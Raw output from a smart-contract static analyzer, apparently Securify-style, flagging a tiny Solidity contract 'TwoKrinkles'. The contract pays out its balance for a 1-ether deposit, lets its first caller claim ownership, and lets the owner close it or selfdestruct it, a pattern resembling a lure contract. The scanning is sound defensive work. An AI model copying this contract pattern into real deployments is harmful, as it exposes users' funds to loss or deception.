Processing contract: /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol:TwoKrinkles
  Attempt to decompile the contract with methods...
  Success. Inlining methods...
  Propagating constants...
  Verifying patterns...
[33mWarning[0m for DAOConstantGas in contract 'TwoKrinkles':
    |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
  > |            msg.sender.transfer(address(this).balance);
    |        }
    |    }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(11)

[33mWarning[0m for LockedEther in contract 'TwoKrinkles':
    |pragma solidity ^0.4.25;
    |
  > |contract TwoKrinkles {
    |    function() public payable {}
    |    address Owner; bool closed = false;
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(3)

[31mViolation[0m for MissingInputValidation in contract 'TwoKrinkles':
    |    address Owner; bool closed = false;
    |    function own() public payable { if (0==Owner) Owner=msg.sender; }
  > |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
    |    function get() public payable {
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(7)

[33mWarning[0m for MissingInputValidation in contract 'TwoKrinkles':
    |    function() public payable {}
    |    address Owner; bool closed = false;
  > |    function own() public payable { if (0==Owner) Owner=msg.sender; }
    |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(6)

[33mWarning[0m for MissingInputValidation in contract 'TwoKrinkles':
    |    function own() public payable { if (0==Owner) Owner=msg.sender; }
    |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
  > |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
    |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(8)

[33mWarning[0m for MissingInputValidation in contract 'TwoKrinkles':
    |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
  > |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
    |            msg.sender.transfer(address(this).balance);
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(9)

[31mViolation[0m for TODAmount in contract 'TwoKrinkles':
    |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
  > |            msg.sender.transfer(address(this).balance);
    |        }
    |    }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(11)

[33mWarning[0m for TODReceiver in contract 'TwoKrinkles':
    |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
  > |            msg.sender.transfer(address(this).balance);
    |        }
    |    }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(11)

[33mWarning[0m for UnhandledException in contract 'TwoKrinkles':
    |    function get() public payable {
    |        if (msg.value>=1 ether && !closed) {
  > |            msg.sender.transfer(address(this).balance);
    |        }
    |    }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(11)

[31mViolation[0m for UnrestrictedWrite in contract 'TwoKrinkles':
    |    function() public payable {}
    |    address Owner; bool closed = false;
  > |    function own() public payable { if (0==Owner) Owner=msg.sender; }
    |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(6)

[33mWarning[0m for UnrestrictedWrite in contract 'TwoKrinkles':
    |    address Owner; bool closed = false;
    |    function own() public payable { if (0==Owner) Owner=msg.sender; }
  > |    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    |    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
    |    function get() public payable {
  at /home/jiaming/mavs_srcs/contract@0x06eb5444bd13815a77d72e336e8fe7dedb801709.sol(7)


